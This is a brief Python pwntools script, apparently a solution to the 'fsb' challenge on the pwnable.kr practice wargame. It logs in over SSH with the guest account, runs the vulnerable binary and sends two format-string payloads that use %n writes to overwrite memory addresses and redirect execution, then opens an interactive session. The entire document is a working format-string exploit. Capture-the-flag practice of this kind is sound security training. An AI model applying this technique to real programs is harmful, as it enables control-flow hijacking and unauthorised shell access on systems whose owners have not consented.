from pwn import *
ssh_pwn=ssh(host='pwnable.kr',user='fsb',port=2222,password='guest')
r=ssh_pwn.process(['./fsb'])
r.sendline('%0{0}x%14$n'.format(0x804a004))
r.sendline('%0{0}x%20$n'.format(0x80486ab))
r.interactive()
